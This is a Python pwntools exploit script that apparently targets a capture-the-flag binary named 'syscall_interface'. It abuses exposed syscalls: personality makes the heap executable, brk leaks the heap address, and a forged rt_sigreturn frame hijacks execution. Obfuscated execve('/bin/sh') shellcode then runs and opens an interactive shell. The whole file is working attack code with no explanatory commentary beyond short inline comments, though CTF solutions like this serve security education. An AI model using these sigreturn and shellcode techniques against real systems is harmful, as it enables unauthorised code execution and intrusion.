from pwn import *
context.update(os='linux', arch='amd64')

def __syscall__(p, num, arg):
    p.sendlineafter('choice:', '0')
    p.sendlineafter('number:', str(num))
    p.sendlineafter('argument:', str(arg))

def __update__(p, user):
    p.sendlineafter('choice:', '1')
    p.sendafter('username:', user)

def exploit(host, port=20004):
    if host:
        p = remote(host, port)
    else:
        p = process('./syscall_interface')
        gdb.attach(p)
    syscall = lambda n,arg: __syscall__(p, n, arg)
    update = lambda usr: __update__(p, usr)

    # sys_personality : make the heap which is allocated later executable
    syscall(135, 0x0400000)
    # sys_brk : leak the end address of the heap
    syscall(12, 0)
    p.recvuntil('RET(')
    heap = int(p.recvuntil(')', drop=True), 16) - 0x22000
    log.info('[heap] '+hex(heap))

    # update username: place partial frame on the stack for rt_sigreturn
    sc = asm('''
        push 0x3b
        pop rax
        mov rbx, 0xFF978CD091969DD1
        neg rbx
        push rbx
        push rsp
        pop rdi
        cdq
        push rdx
        pop rsi
        syscall
    ''')
    partial_frame = [ # starts from rbp
        sc.rjust(0x28, '\x90'),
        heap+0x800, # rsp
        heap+0x50,  # rip
        0,          # eflags
        p16(0x33),  # cs
        p32(0), # gs, fs
        p16(0x2b),  # ss
    ]
    update(flat(partial_frame))

    # sys_restart_syscall : put shellcode on the heap when using printf("... by @%s", ... , username)
    syscall(219, 0)
    # sys_rt_sigreturn : hijack rip points to shellcode on the heap
    syscall(15, 0)

    p.interactive()

if __name__ == '__main__':
    exploit(args['REMOTE'])